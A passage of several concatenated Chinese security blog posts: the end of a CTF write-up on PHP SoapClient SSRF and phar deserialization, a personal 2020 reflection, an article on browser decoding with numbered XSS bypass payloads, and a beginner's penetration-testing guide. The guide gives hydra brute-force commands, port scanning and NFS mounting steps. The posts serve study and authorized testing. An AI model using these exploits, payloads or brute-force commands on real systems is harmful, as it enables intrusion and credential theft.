$_GET[name];}var_dump($_SESSION);$a = array(reset($_SESSION),&apos;welcome_to_the_lctf2018&apos;);call_user_func($b,$a);?&gt; flag.php &lt;?phpsession_start();echo &apos;only localhost can get flag!&apos;;$flag = &apos;LCTF{*************************}&apos;;if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;){ $_SESSION[&apos;flag&apos;] = $flag; }?&gt; flag.php 跟 index.php 之间的微妙联系体现在$_SESSION[&apos;flag&apos;] = $flag;var_dump($_SESSION); $_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;。这里自然想到SSRF。可以利用上文提到的php原生类SoapClient中的__call方法进行SSRF。 构造SSRF的POC (POC来自 @Smi1e) &lt;?php$url = &quot;http://127.0.0.1/flag.php&quot;;$b = new SoapClient(null, array(&apos;uri&apos; =&gt; $url, &apos;location&apos; =&gt; $url));$a = serialize($b);$a = str_replace(&apos;^^&apos;, &quot;\\r\\n&quot;, $a);echo &quot;|&quot; . urlencode($a);?&gt; index.php 中涉及到了call_user_func 函数。PHP手册中 给了几个call_user_func 函数的例子: https://www.php.net/manual/zh/function.call-user-func.php其中需要注意的是当我们的第一个参数为数组时，会把第一个值当作类名，第二个值当作方法进行回调 为了进行反序列化只能利用PHP中SESSION反序列化机制。主要体现在差异性(当序列化的引擎和反序列化的引擎不一致时，就可以利用引擎之间的差异产生序列化注入漏洞)。但是在PHP中默认使用的是PHP引擎。所以这里为了展现session的差异性，我们需要通过代码手动构造差异性。 通过 call_user_func($_GET[&apos;f&apos;], $_POST); 构造PHP引擎差异性。并通过 $_SESSION[&apos;name&apos;] = $_GET[&apos;name&apos;]; 将构造的Soap类序列化字符串写入session文件 为了调用 __call 方法。首先利用call_user_func($_GET[&apos;f&apos;], $_POST);传入 f=extract 进行POST变量覆盖。随后通过GET传参令$_SESSION[&apos;name&apos;] = SoapClient。再利用POST传参进行变量b的覆盖。即调用 SoapClient 类不存在的 welcome_to_the_lctf2018 方法，从而触发 __call 方法发起 soap 请求进行 SSRF 。 最后携带cookie访问 Phar拓展攻击面Phar简介拓展攻击面体现在: 可通过构造 phar 在没有 unserailize() 的情况下实现反序列化攻击 由 PHPGGC 理解 PHP 反序列化漏洞 一文中对其概念概括十分简洁明了 简单来说phar就是php压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与file:// ，php://等类似，也是一种流包装器。 phar结构由 4 部分组成 stub phar 文件标识，格式为 xxx&lt;?php xxx; __HALT_COMPILER();?&gt;； manifest 压缩文件的属性等信息，以序列化存储； contents 压缩文件的内容； signature 签名，放在文件末尾； 这里有两个关键点，一是文件标识，必须以__HALT_COMPILER();?&gt;结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者pdf文件来绕过一些上传限制；二是反序列化，phar存储的meta-data信息以序列化方式存储，当文件操作函数通过phar://伪协议解析phar文件时就会将数据反序列化，而这样的文件操作函数有很多。 利用条件: phar文件要能够上传到服务器端。 要有可用的魔术方法作为“跳板”。 文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。 生成Phar&lt;?php class TestObject { } @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $o = new TestObject(); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering();?&gt; PS: 要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件 触发条件@secii 师傅文中提到: php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化 fileatime / filectime / filemtime stat / fileinode / fileowner / filegroup / fileperms file / file_get_contents / readfile / fopen file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writable parse_ini_file unlink copy 随后 @zsx 师傅blog中 Phar与Stream Wrapper造成PHP RCE的深入挖掘 对其进行了更深入的挖掘 exif exif_thumbnail exif_imagetype gd imageloadfont imagecreatefrom*** hash hash_hmac_file hash_file hash_update_file md5_file sha1_file file / url get_meta_tags get_headers standard getimagesize getimagesizefromstring zip$zip = new ZipArchive();$res = $zip-&gt;open(&apos;c.zip&apos;);$zip-&gt;extractTo(&apos;phar://test.phar/test&apos;); Bzip / Gzip如果限制了phar://不能出现在头几个字符。可用 compress.bzip2:// 和 compress.zlib:// 添加至 phar:// 前面进行 bypass$z = &apos;compress.bzip2://phar:///home/sx/test.phar/test.txt&apos;; MySQLLOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper&lt;?phpclass A { public $s = &apos;&apos;; public function __wakeup () { system($this-&gt;s); }}$m = mysqli_init();mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);$s = mysqli_real_connect($m, &apos;localhost&apos;, &apos;root&apos;, &apos;123456&apos;, &apos;easyweb&apos;, 3306);$p = mysqli_query($m, &apos;LOAD DATA LOCAL INFILE \\&apos;phar://test.phar/test\\&apos; INTO TABLE a LINES TERMINATED BY \\&apos;\\r\\n\\&apos; IGNORE 1 LINES;&apos;); 例子参考另一篇 blog HITCON 三题递进PHP反序列化 HITCON2017 中的 Baby^H Master PHP 2017 一题 referhttps://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label2_1https://coomrade.github.io/2018/10/26/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E9%9D%A2%E6%8B%93%E5%B1%95%E6%8F%90%E9%AB%98%E7%AF%87/https://www.smi1e.top/lctf2018-bestphps-revenge-%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/https://blog.zsxsoft.com/post/38","link":"/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"回首2020，展望2021","text":"迟到的 2020 年末总结 2020一开始放假回家，聚餐见了很多许久没见的朋友，之后因为疫情的传播和蔓延，基本不出门了 还记得家里当时囤了好多东西，足够吃上一阵子，因此我的 2020 的上半年因为疫情的原因，基本上都是在家度过的 后来面试了鹅厂，并在第三次面试的时候 “成功” 的把 “17:00” 看成了晚上七点钟，以至于鸽掉了我们部门的 leader。现在想想当时的操作真是令人窒息。 但部门 leader 的性格非常随和，在我的道歉和解释后进行了第三次补面，再后来成为了鹅厂的一员。 之后开启了人生的第一份工作，前往深圳漂泊 最后开学了，也转到了远程实习 2020 基本没有打 CTF，唯一一个强网杯线下第一轮就无了 比赛慢慢从 CTF 三个字母转到了 HW 两个字母，而越接近实战也就越知道了自己知识面的匮乏 20212021年1月8日，在鹅厂的第 262 天，准备提交离职申请 和大多数实习生一样，我无法平衡工作和学习的那根杠杆，面对即将到来的应届生校招，我显得焦虑而不安。感觉自己的成长离自己的期望还有很长一段距离，因此选择了离职去沉淀自己 离别的伤感往往不是来源于事情本身，而是那份离开习惯的难以割舍和释然 我习惯了每天凌晨的打卡，习惯了每周的周会，习惯了没事查看有没有新的福利，也习惯了和部门的人相处的时光 突然感觉写的有些伤感了，其实内心更多的是释然吧，我不再需要完成每周的任务，有了更多自由的时间去分配我想学习的知识，因为我还需要学习的东西真的太多了 离别也不仅只是伤感的，组长欣然接受了我的离开，并对我在职期间的工作表示了肯定和赞扬 部门的技术和氛围都是非常不错的，很荣幸有这一段实习经历 江湖再见吧 ～ 整理了一个大概的框架，都是需要去逐步细化的知识点，还有好多没有学习的内容，希望能通过之后的时间一点一点消化掉 End ：希望2021慢慢进步吧 ❤️","link":"/2021/01/08/%E5%9B%9E%E9%A6%962020%EF%BC%8C%E5%B1%95%E6%9C%9B2021/"},{"title":"浏览器解析机制与渲染过程","text":"浏览器编解码与XSS bypass 序章论一张图打败你学 XSS 的信心。（转自微博 附上 MDN DOM 事件参考: https://developer.mozilla.org/zh-CN/docs/Web/Events 本文参考多篇文章，涉及相关晦涩难懂名词解释，术语解释。均是 CTRL c v 。属于只可意会不可言传的领域。其他的知识都会尽量经我口中阐述的简单一点。 浏览器的解码浏览器的解码规则 HTML解析器对HTML文档进行解析完成HTML解码并且创建DOM树 javascript 或者 CSS解析器对内联脚本进行解析，完成JS CSS解码 URL解码会根据URL所在的顺序不同而在JS解码前或者解码后 当浏览器从网络堆栈中获得一段内容后，触发HTML解析器来对这篇文档进行词法解析。在这一步中字符引用被解码。在词法解析完成后，DOM树就被创建好了，JavaScript解析器会介入来对内联脚本进行解析。在这一步中Unicode转义序列和Hex转义序列被解码。同时，如果浏览器遇到需要URL的上下文，URL解析器也会介入来解码URL内容。在这一步中URL解码操作被完成。由于URL位置不同，URL解析器可能会在JavaScript解析器之前或之后进行解析。 Example A: &lt;a href=&quot;UserInput&quot;&gt;&lt;/a&gt;Example B: &lt;a href=# onclick=&quot;window.open(&apos;UserInput&apos;)&quot;&gt;&lt;/a&gt;Example C: &lt;a href=&quot;javascript:window.open(&apos;UserInput&apos;)&quot;&gt; 在例A中，HTML解析器将首先开始工作，并对UserInput中的字符引用进行解码。然后URL解析器开始对href值进行URL解码。最后，如果URL资源类型是JavaScript，那么JavaScript解析器会进行Unicode转义序列和Hex转义序列的解码。再之后，解码的脚本会被执行。因此，这里涉及三轮解码，顺序是HTML，URL和JavaScript。 在例B中，HTML解析器首先工作。然而接下来，JavaScript解析器开始解析在onclick事件处理器中的值。这是因为在onclick事件处理器中是script的上下文。当这段JavaScript被解析并被执行的时候，它执行的是“window.open()”操作，其中的参数是URL的上下文。在此时，URL解析器开始对UserInput进行URL解码并把结果回传给JavaScript引擎。因此这里一共涉及三轮解码，顺序是HTML，JavaScript和URL。 例C与例A很像，但不同的是在UserInput前多了window.open()操作。因此，对UserInput多了一次额外的URL解码操作。总的来说，四轮解码操作被完成，顺序是HTML，URL，JavaScript和URL。 HTML 解析概括 HTML 中五类元素。详细可直接参考HTML5 语法https://www.w3.org/html/ig/zh/wiki/HTML5/syntax 空元素: 空一字体现在不能容纳内容。一般的标签由 &lt;start&gt;content&lt;/end&gt;这样组成。空元素意味着没有闭合标签的标签。如: &lt;area&gt;,&lt;br&gt;,&lt;base&gt; 原始文本元素: 可以容纳内容。 &lt;script&gt;和&lt;style&gt;。 RCDATA元素，可以容纳文本和字符引用。&lt;textarea&gt;和&lt;title&gt; 外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释: 如 MathML命名空间或者SVG命名空间的元素 基本元素，可以容纳文本、字符引用、其他元素和注释: 除了以上4种元素以外的元素 上面的内容我提炼了较为陌生的专业术语 字符引用 RCDATA 外部元素 什么是字符引用？字符引用包括“字符值引用”和“字符实体引用”。如在HTML中，&lt;对应的字符值引用为&amp;#60;，对应的字符实体引用为&amp;lt;。字符实体引用也被叫做“实体引用”或“实体”——》再次延伸概念: 字符实体字符实体是一个转义序列，它定义了一般无法在文本内容中输入的单个字符或符号。一个字符实体以一个&amp;符号开始，后面跟着一个预定义的实体的名称，或是一个#符号以及字符的十进制数字。——》产生问题: 为啥我要用字符实体呢，要经过转义这么麻烦的操作 ——〉HTML字符实体在HTML中，某些字符是预留的。例如在HTML中不能使用“&lt;”或“&gt;”，这是因为浏览器可能误认为它们是标签的开始或结束。如果希望正确地显示预留字符，就需要在HTML中使用对应的字符实体。 外部元素容纳种类的比空元素、原始文本元素多，有什么用呢？Foreign elements ——》 SVG黑魔法&lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt; 这个payload能执行的原因是因为 &lt;svg&gt; 遵循XML和SVG的定义。在XML中，&amp;#40;会被解析成 （。同理 &lt;svg&gt;&lt;script&gt;alert&amp;#x28;1);&lt;/script&gt; 也可以造成 XSStips: 在XML中实体会自动转义,除了&lt;![CDATA[和]]&gt;包含的实体 下面开始进入HTML解析过程… 一个HTML解析器作为一个状态机，HTML解析器有很多种状态。进行状态转换的方式是从输入流中获取字符并按照转换规则转换。以 &lt;start&gt;content&lt;/end&gt; 为例子。HTML识别开始和结束标签的核心是 / 符号。当HTML解析器遇到 &lt; 且没有 / 。就会进入 标签开始状态 然后转变到 标签名状态， 前属性名状态 … 最后进入 数据状态。 并释放当前标签的token。当解析器处于数据状态时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。 容纳字符实体的作用: 在这些状态中HTML字符实体将会从 &amp;#...形式解码。三种情况可以容纳字符实体： 数据状态中的字符引用，RCDATA状态中的字符引用和属性值状态中的字符引用。 有一种可以容纳字符引用的情况是 RCDATA状态中的字符引用。这意味着在&lt;textarea&gt;和&lt;title&gt;标签中的字符引用会被HTML解析器解码。且在解析这些字符引用的过程中不会进入 标签开始状态 。对RCDATA有个特殊的情况。在浏览器解析RCDATA元素的过程中，解析器会进入 RCDATA状态。在这个状态中，如果遇到&lt;字符，它会转换到RCDATA小于号状态。如果&lt;字符后没有紧跟着/和对应的标签名，解析器会转换回RCDATA状态。这意味着在RCDATA元素标签的内容中（例如&lt;textarea&gt;或&lt;title&gt;的内容中），唯一能够被解析器认做是标签的就是&lt;/textarea&gt;或者&lt;/title&gt;。当然，这要看开始标签是哪一个。因此，在&lt;textarea&gt;和&lt;title&gt;的内容中不会创建标签，不会有脚本执行。 URL 解析URL资源类型必须是ASCII字母（U+0041-U+005A || U+0061-U+007A），不然就会进入“无类型”状态。例如，你不能对协议类型进行任何的编码操作，不然URL解析器会认为它无类型。 JavaScript 解析Unicode转义序列只有在标识符名称里不被当作字符串，也只有在标识符名称里的编码字符能够被正常的解析。javascript解码器无法试别编码后的控制字符，比如：单引号，双引号和圆括号，之后会用一些例子进行详细说明。 Python 转码脚本自己最近在写一个XSS的扫描脚本，其中一个模块具有判断 XSS payload 的有效性的功能。这里给出部分转码片段 import htmlimport refrom urllib.parse import unquotepayload = &apos;&apos;def decodeHTML(): dh = html.unescape() return dhdef decodeURL(): du = unquote() return dudef decodeUnicode(payload): duni = payload.encode(&apos;utf-8&apos;).decode(&apos;unicode_escape&apos;) return duni 从payload看解析流程1、&lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt;不弹窗， 原因: 识别到 href ，属性值状态中的字符引用。进入url模块解析。URL规定协议，用户名，密码都必须是ASCII。且不能对协议类型进行任何的编码操作。这里的 javascript 协议无法识别。 2、&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt; 弹窗， 原因: 属性值状态中的字符引用。识别到实体化编码内容，进入html解码得到 &lt;a href=&quot;javascript:%61%6c%65%72%74%28%32%29&quot;&gt;。然后进入 URL 解析。此时可正确识别协议类型。解码得到&lt;a href=&quot;javascript:alert(2)&quot;&gt; 最后 JavaScript 解析。 3、&lt;a href=&quot;javascript%3aalert(3)&quot;&gt;&lt;/a&gt; 不弹窗， 原因同一， 这里 javascript: 为协议，任何一部分内容都不能编码 4、&lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;不弹窗， 原因: 属性值状态中的字符引用，先进行 HTML 解析。但 HTML 解析机制中&amp;#60;会被 HTML 解码，但不会进入标签开始状态，当然也就不会创建 img 元素。(HTML编码就是为了显示这些特殊字符，而不干扰正常的DOM解析) 5、&lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;不弹窗， 原因为: &lt;textarea&gt;是RCDATA元素，可以容纳文本和字符引用，注意不能容纳其他元素，HTML解码得到&lt;textarea&gt;&lt;script&gt;alert(5)&lt;/script&gt;&lt;/textarea&gt;但 &lt;textarea&gt;只容纳文本和字符引用。因此js无法执行 6、&lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt;不弹窗， 原因同5 7、&lt;button onclick=&quot;confirm(&apos;7&amp;#39;);&quot;&gt;Button&lt;/button&gt;弹窗， 原因: 属性值状态中的字符引用，先进行HTML解码。然后JS执行 8、&lt;button onclick=&quot;confirm(&apos;8\\u0027);&quot;&gt;Button&lt;/button&gt;不弹窗， 原因: 在JavaScript中，标识符只能包含字母或数字或下划线（“_”）或美元符号（“$”），且不能以数字开头。 onclick中的值会交给JS处理，在JS中只有字符串和标识符能用Unicode表示，&apos;显然不行，JS执行失败。 9、&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;不弹窗， 原因: script标签属于原始文本元素。无法容纳字符引用，所以无法进行HTML解码。因此JS解析时并不能执行弹窗 10、&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(10);&lt;/script&gt;弹窗， 原因: 直接进入 JavaScript 解析。且发现unicode编码，其为 alert 标识符进行编码后的字符串。所以能先解码，然后执行 11、&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029&lt;/script&gt;不弹窗， 原因同8: 出现括号进行了unicode编码，JS无法识别编码后的控制字符 12、&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)&lt;/script&gt;不弹窗， 其实个人最开始看到payload是感觉能弹窗的，后来参考了别人的思路。发现\\u0031\\u0032在解码的时候会被解码为字符串12。需要引号包裹。因此不执行JS 13、&lt;script&gt;alert(&apos;13\\u0027)&lt;/script&gt;不弹窗，原因同8: 出现单引号进行了unicode编码，JS无法识别编码后的控制字符 14、&lt;script&gt;alert(&apos;14\\u000a&apos;)&lt;/script&gt;弹窗。原因: \\u000a在JavaScript里是换行，就是\\n，直接执行 组合拳:&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;&quot;&gt;&lt;/a&gt; 先进行HTML解码得&lt;a href=&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)&quot;&gt;&lt;/a&gt;然后进入 URL 模块处理，发现完整 javascript: 协议，进行URL解码。得javascript:\\u0061\\u006c\\u0065\\u0072\\u0074(15)控制字符 ()未被unicode编码，因此进行 JavaScript 解码，成功弹窗 浏览器渲染浏览器的呈现引擎呈现引擎默认可以解析html文档、xml文档以及图片等资源并将解析后的内容展示给用户。通过各种插件（浏览器扩展程序）浏览器还可以展示其他各类型的web资源，如pdf插件可以让浏览器展示pdf文档。不同浏览器使用的呈现引擎也不一样，目前主流的呈现引擎有Webkit、Blink(Webkit的一个分支)、Gecko、Trident、EdgeHTML(Trident的一个分支)。 浏览器 呈现引擎 Chrome Blink（Chrome 28+） Webkit（Chrome 27-） Safari Webkit Firefox Gecko Edge EdgeHTML IE Trident 页面呈现原理当我们点击一个链接，服务器将 HTML 代码传输到我们的浏览器，浏览器在接收到这份 HTML 代码之后进行的页面的呈现，粗略的说会经过以下这些步骤： DOM 树的构建（Parse HTML） 构建 CSSOM 树（Recaculate Style） 合并 DOM 树与 CSSOM 树为 Render 树 布局（Layout） 绘制（Paint） 复合图层化（Composite） 页面呈现过程中的阻塞 当遇到 JavaScript 脚本或者外部 JavaScript 代码时，浏览器便停止 DOM 的构建（阻塞 1） 当遇到 &lt;script&gt; 标签需要执行脚本代码时，浏览器会检查是否这个 &lt;script&gt; 标签以上的 CSS 文件是否已经加载并用于构建了 CSSOM，如果 &lt;script&gt; 上部还有 CSS 样式没加载，则浏览器会等待 &lt;script&gt; 上方样式的加载完成才会执行该 &lt;script&gt; 内的脚本（阻塞 2） DOM 树与 CSSOM 树的成功构建是后面步骤的根基（同步阻塞） 同时外部脚本、外部样式表的下载也是耗费时间较多的点 Webkit和Gecko的流程对比Webkit的主要流程（图片摘自Tali Garsiel的研究成果) Gecko的主要流程（图片摘自Tali Garsiel的研究成果） 参考链接从浏览器渲染与解码原理重新认识xss浏览器解码看XSS深入理解浏览器解析机制和XSS向量编码浏览器的工作原理：新式网络浏览器幕后揭秘浏览器内核、JS 引擎、页面呈现原理及其优化从Chrome源码看浏览器如何构建DOM树不同内核浏览器的差异以及浏览器渲染简介","link":"/2020/03/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%B8%B2%E6%9F%93%E8%BF%87%E7%A8%8B/"},{"title":"第一次渗透测试的分享和小结","text":"文章首发于先知社区：https://xz.aliyun.com/t/6078 说在前面首先很重要的是授权 ~ 首先很重要的是授权 ~ 首先很重要的是授权 ~ “为了给家乡做点贡献” 男子入侵政府网站… 之前也看过很多关于渗透测试的文章，但是因为一些现实因素等等问题，没（bu）有(gan)真正实操，最近由于一次偶然的机会，什么都不会的我接到了一个渗透测试项目 然后就把最近学到的一些东西，和一些小感悟，小技巧记录下来，由于一些特殊原因，本文中不涉及到渗透过程中的任何敏感信息 第一次进行渗透如何优雅的”装”成是个”老手”首先跟我一样菜当然是装不出大神的，当然还是多学，多积累最重要，但是既然都开始了，就不能显得太划水，下面的操作不能让你成为大神，但是可以让你在整个过程中”忙”起来 相比于网上那些很详细的手把手渗透教学，本文主要写一些到 xx公司 直接内网渗透测试的那种简要步骤 所以这一小节主要写给那些才接触安全，或者没有真正做过渗透测试的人吧 大佬轻喷，如果有错误的地方也欢迎批评指正… 需要准备什么？能够使用以下工具Nessus AWVS Appscan burpsuite sqlmap Github &amp; Google 搜索框 Hydra 自己收集的一大堆 CVE 的 exp 各个中间件漏洞的利用工具 工具当然是越多越好 一些好用的字典弱密码是一个亘古不变的问题，可能公司后台弱密码改掉了，可是一个公司这么多员工，可能有员工没有改自己原先的弱密码…或者公司一些设备没有改掉默认密码…所以一个好用的密码字典显得尤其关键 配合上 Hydra 或者其他好用点的爆破工具的使用，常常能够有不错的收获 提供以下几个生成字典方式 Github上有很多收集好的字典https://github.com/rootphantomer/Blasting_dictionary更多的可以在Github上自行寻找 可能你需要生成一些特殊定制的在线生成地址一在线生成地址二 下面的py脚本你也可以尝试使用 pydictor 下载地址 使用指南 somd5 提供的字典：https://www.somd5.com/download/dict/ 可能你需要学会配置IP如果你需要你接进内网进行测试的时候，通常会要求你手动配置IP，如果不会配置到了现场就会像我一样很丢人… 右键点击： 点击： 点击： 右键点击当前你链接，选择属性： 双击： 填入他们给你提供的IP： 新手的渗透测试的打开方式本着划水也要划得合理一点的态度，如果刚好你也是第一次做渗透测试，就算不知道具体干什么，过程中也不要显得太无所事事了… 下面的操作适用于在放开中间一切安全设备（各种防火墙等…），所以作为一个技术不是很高超的新手，合理利用手里的现有工具就显得至关重要 很多大佬都说过渗透测试的本质是信息收集，信息收集的步骤和手段在先知已经有很多专门文章详细的阐述过 信息收集 一般去这种公司帮忙做渗透他们都会给你一定的资产（如内网IP，设备型号等），但一般是不够的。所以完成以下的步骤，也可以在一定程度上帮助你收集一些信息… 全都丢进工具跑首先把资产里所有IP丢进 Nessus Nessus 本身扫描的过程中也会包含端口，但是如果你嫌慢你可以使用nmap扫描…nmap -p 1-65535 -T4 -A -v &lt;IP&gt; 然后你嫌nmap慢可以使用 masscan…masscan &lt;IP&gt; -p0-65535 - rate 1000000 扫出来了Web的端口，如80,8080,443等（具体的还得具体看），丢进AWVS进一步扫描分析 含有 ftp，ssh，mysql的端口可以丢进 hydra 爆破1、破解ssh： hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh 2、破解ftp： hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV 3、get方式提交，破解web登录： hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/ hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php4、post方式提交，破解web登录： hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form &quot;/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=login:sorry password&quot; hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form &quot;login.php:id=^USER^&amp;passwd=^PASS^:&lt;title&gt;wrong username or password&lt;/title&gt;&quot; （参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,&lt;title&gt;中 的内容是表示错误猜解的返回信息提示。） 5、破解https： hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https 10、破解rdp： hydra ip rdp -l administrator -P pass.txt -V 如果扫出445端口可以尝试一下 ms17-010 ,丢进msf里使用相应的模块进行验证 如果扫出3389端口可以尝试一下最新爆出的 CVE-2019-0708 (其实真的挺多都没打补丁的)，也能使用msf扫描，还可以使用 360 的漏洞扫描工具，或者使用Github上搜索其他poc进行验证CVE-2019-0708： Windows RDP远程漏洞无损检测工具下载 然后在各种扫描时候的闲暇时间，你就可以开展对一个网站的常规渗透，先扫个目录(dirsearch和御剑都行)，然后熟悉web站点的各个功能点，再根据功能来测试相应的漏洞是否存在…必要的时候burpsuite抓包，一个包一个包的看… PS：一般对Web站点准备开始渗透时往往都变成了和登陆框的战斗，可以先上来burpsuite跑个几个弱密码字典，然后对登录框进一步测试sql注入，另外：如果有注册账号界面或者忘记密码界面可以尝试验证码爆破（4位数验证码就试一下），短信轰炸，任意账号注册找回等，然后记得看一下URL，如果后面的参数为 ?returnurl=xxx.com,可以尝试一下url跳转…（如果经历了大量的工程，对登录框毫无办法，连网站都没进去，无法展开下一步测试的时候，就自己注册一个账号，或者找他们提供一个测试账号叭… 然后在你忙以上操作的时候，就显得不是那么的划水，作为一个脚本小子也要有脚本小子应有的样子 善用搜索进行辅助验证经过一段时间的等待，可能 Nessus 和 AWVS 都扫得差不多了…这个时候如果自己积累不多就寻找一切能够搜索的东西对扫描结果进行辅助验证…（百度、谷歌、Github等… 如果是 CVE 就先去msf里面search一下，如果没有也可以去 Github 上找一波可以直接利用的 exp，或者可以看看各大论坛有没有大佬之前分析过…然后跟着手动复现，途中可能遇到很多莫名其妙没有复现成功的问题也可以通过善用搜索进行解决 然后各大论坛真的有很多很多很强的师傅们，每当你遇到过没见到过的漏洞，基本上都会有师傅分析过，吸取他们的经验完成你的渗透任务也是个事半功倍的事情 浅谈遇到过的有趣的东西后知后觉还是积累太少 NFS的安全隐患这个是真的第一次遇到，一开始还以为没什么，一顿操作发现可以看到几乎全部共享的数据（orz… 起因是 Nessus 爆洞 然后我现找了写的很详细的文章进行对该漏洞进行了复现 针对NFS的渗透测试 简单来说就是两步走：showmount -e &lt;IP&gt; 然后挂载到本地mkdir &lt;创建一个目录&gt;mount -t nfs &lt;ip&gt;:/&lt;你要挂的目录&gt; /&lt;你刚刚创建的目录&gt; -o nolock 这个点真的能拿蛮多数据的 后面就不贴图了… 弱密码啊弱密码真的好多好多弱密码！ 小技巧就是验证爆破用户名的方法就是看response包里的返回结果…比如存在用户名但是密码不对，就会显示用户名和密码不匹配，但是如果没有用户名就会显示不存在用户名然后先根据返回包找到合适的用户名，再用字典有针对性的爆破该用户名的密码。如果没有回显可以通过 忘记密码 等选项来进一步测试，找回过程中如果说用户正确就会进入下一步操作，比如发送短信验证码，如果说没有用户就不会进入下一步操作 首先一般弱密码发生在如下几个地方： 没有限制登录失败次数的登录框 没有验证码或者验证码可以绕过(比如采用前端校验)的登录框 经过渗透测试统计和分析，将弱密码大致分为以下几个情况 js里有注释掉的测试账号密码 各种登录界面，各种后台存在测试账号，且可以看到敏感数据（这就可能是为什么test test 可以进去的原因吧） 改了管理后台页面的所有弱密码，但是在其他地方，比如办公系统等，有员工没有改自己的登录密码，经过爆破可以登录员工账号 很多公司采用的系统是外部开发的，外部开发的时候有测试账号是弱密码，但是可能交接过程中存在一些问题，导致这边公司根本就不知道有这个账号密码 很多设备，比如内网里面的防火墙，直接使用了出厂默认的密码 大家都比较懒，都不想注册很长的密码，然后可能又觉得11111这种不合适，所以就有了那种键盘连键，如qwe123之类的，导致跑一个字典出一堆账号密码 